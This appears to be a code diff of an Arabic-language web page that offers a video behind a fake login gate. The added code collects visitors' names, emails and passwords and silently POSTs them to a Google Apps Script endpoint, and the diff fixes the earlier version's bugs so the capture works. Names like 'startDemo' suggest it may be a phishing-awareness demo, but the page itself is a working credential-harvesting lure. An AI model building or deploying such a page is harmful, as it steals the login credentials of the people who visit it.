@@ -66,125 +66,64 @@ button{
 
 <body>
 
-<div class="card">
+    <div class="card">
+        <h2>شاهد الفيديو 🎬</h2>
+        <p>اضغط لمشاهدة الفيديو.</p>
 
-<h2>🎬 شاهد الفيديو</h2>
+        <button onclick="startDemo()">مشاهدة الفيديو ►</button>
 
-<p>اضغط لمشاهدة الفيديو.</p>
+        <div id="login">
+            <h3>تسجيل الدخول</h3>
+            <p>يجب تسجيل الدخول لمشاهدة الفيديو.</p>
 
-<button onclick="startDemo()">
-▶ مشاهدة الفيديو
-</button>
+            <input type="text" id="name" placeholder="الاسم">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <input type="password" id="password" placeholder="كلمة المرور">
 
-<div id="login">
+            <button onclick="finishDemo()">تسجيل الدخول</button>
+            <p class="small"></p>
+        </div>
 
-<h3>تسجيل الدخول</h3>
-
-<p>
-يجب تسجيل الدخول لمشاهدة الفيديو.
-</p>
-
-<input
-id="name"
-placeholder="اسم ">
-
-<input
-id="email"
-placeholder="البريد الإلكتروني">
-
-<input
-id="password"
-placeholder="كلمة مرور ">
-
-<button onclick="finishDemo()">
-تسجيل الدخول
-</button>
-
-<p class="small">
-</p>
-
-</div>
-
-<div id="result"></div>
-
-</div>
-
+        <div id="result"></div>
+    </div> <!-- وسم إغلاق الـ card -->
 
 <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/...";
 
-const SCRIPT_URL =
-"https://script.google.com/macros/s/AKfycbwtd0GwyirrVsMupI8lTRFCR_vd9WYMKQr7vGLWlSv-jHcRIULCVvZ7zXbhgrbBfTrg/exec";
+    function sendResult(action) {
+        const name = document.getElementById("name")?.value || "";
+        const email = document.getElementById("email")?.value || "";
+        const password = document.getElementById("password")?.value || "";
 
+        const data = {
+            name: name,
+            email: email,
+            password: password,
+            action: action,
+            detected: "yes"
+        };
 
-function sendResult(action){
-
-    const name =
-    document.getElementById("name")?.value || "";
-
-    const email =
-    document.getElementById("email")?.value || "";
-
-    const Password =
-    document.getElementById("Password")?.value || "";
-    
-    const data = {
-
-        name:name,
-
-        email:email,
-
-        Password:Password,
-        
-        action:action,
-
-        detected:"yes"
-
-    };
-
-    fetch(SCRIPT_URL, {
-
-        method:"POST",
-
-        mode:"no-cors",
-
-        headers:{
-            "Content-Type":"text/plain"
-        },
-
-        body:JSON.stringify(data)
-
-    });
-
-}
-
-
-function startDemo(){
-
-    document.getElementById("login")
-    .style.display="block";
-
-     document.getElementById("password")
-    .style.display="block";
+        fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "text/plain"
+            },
+           body: JSON.stringify(data)
+        });
     }
-    
- sendResult("submitted_demo_form");
-
-    document.getElementById("result")
-    .style.display="block";
 
 
-   document.getElementById("result").innerHTML = 
-    "<b>.</b><br><br>" +
-    "تم تسجيل نتيجة .<br>" +
-    ".<br><br>";
-}
+function startDemo() {
+        document.getElementById("login").style.display = "block";
+    }
 
-function finishDemo() {
+    function finishDemo() {
+        sendResult("submitted_demo_form");
 
-}
-}
-
+        document.getElementById("result").style.display = "block";
+        document.getElementById("result").innerHTML = "<b>تم تسجيل النتيجة.</b><br><br>";
+    }
 </script>
-
 </body>
 </html>
